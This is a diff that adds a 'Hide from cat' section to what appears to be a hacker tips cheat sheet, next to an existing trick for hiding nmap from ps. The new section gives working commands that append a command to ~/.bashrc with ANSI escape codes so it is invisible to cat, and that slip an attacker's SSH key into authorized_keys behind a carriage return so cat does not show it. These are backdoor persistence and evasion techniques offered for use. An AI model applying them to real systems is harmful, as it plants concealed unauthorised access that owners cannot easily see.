@@ -15,6 +15,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Hide a process as user](#hide-a-process-user)
    1. [Hide a process as root](#hide-a-process-root)
    1. [Hide scripts](#hide-scripts)
+   1. [Hide from cat](#cat)
 1. [SSH](#ssh)
    1. [Almost invisible SSH](#ssh-invisible)
    1. [SSH tunnel](#ssh-tunnel)
@@ -229,6 +230,29 @@ ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prn
 ```
 
 (The same works for `lsof`, `ss` and `ls`)
+
+<a id="cat"></a>
+**1.viii. Hide from cat**
+
+ANSI escape characters or a simple `\r` (carriage return) can be used to hide from `cat` and others.
+
+Hide the last command (example: `id`) in `~/.bashrc`:
+```sh
+echo  -e "id #\\033[2K\\033[1A" >>~/.bashrc
+### The ANSI escape sequence \\033[2K erases the line. The next sequence \\033[1A
+### move the cursor 1 line up.
+### The '#' after the command 'id' is needed so that bash still executes the 'id'
+### but ignores the two ANSI escape sequences.
+```
+Note: We use `echo -e` to convert `\\033` to the ANSI escape character (hex 0x1b).
+
+Adding a `\r` (carriage return) goes a long way to hide your ssh key from `cat`:
+```shell
+IFS=""
+echo "ssh-ed25519 AAAAourkeys....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
+### This adds our key as the first key and 'cat authorized_keys1' wont show
+### it. The $'\r' is a bash special to create a \r (carriage return).
+```
 
 ---
 <a id="ssh"></a>
